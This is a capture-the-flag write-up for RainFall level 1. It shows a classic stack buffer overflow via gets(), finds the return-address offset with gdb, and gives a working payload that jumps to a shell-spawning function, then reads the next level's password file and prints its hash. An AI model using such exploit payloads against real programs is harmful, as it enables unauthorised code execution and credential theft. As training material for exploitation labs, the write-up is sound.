# Level 1

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector -static source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>

void run(void)
{
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main(void)
{
    char buffer[64];
    gets(buffer);
}
```

Let's focus on the `main` function. It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read.

In this case, the program's stack is allocated 80 bytes:
```
# Allocating 80 bytes on the stack
0x08048486 <+6>:     sub    $0x50,%esp

# Calculate the address of esp + 16, since we allocated 80 bytes for the stack our buffer will therefore be 64 bytes.
0x08048489 <+9>:     lea    0x10(%esp),%eax
```

The buffer is 64 bytes long. Therefore, passing more than 64 bytes to the program will result in a buffer overflow. Our goal is to overflow the stack until we reach the return address of the main function, which is 12 bytes after the buffer.
> If the stack layout isn't as straightforward as the one in this exercise, you can just use a [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), to find the offset of the return address. However when possible try to understand the stack layout with the `sub` instruction.

Anything written beyond those 76 bytes (64 bytes of buffer + 12 bytes to reach the return address) will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

Now, we need to find the address of the `run` function, which spawns a shell, to jump to it:
```
(gdb) info function run
All functions matching regular expression "run":

Non-debugging symbols:
0x08048444  run
```

Let's craft our payload:
```bash
64 bytes + 12 bytes = 76 bytes
\x08\x04\x84\x44 = 0x08048444 address of run function

level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && cat) | ./level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We are now level2! Let's move on to the next level.
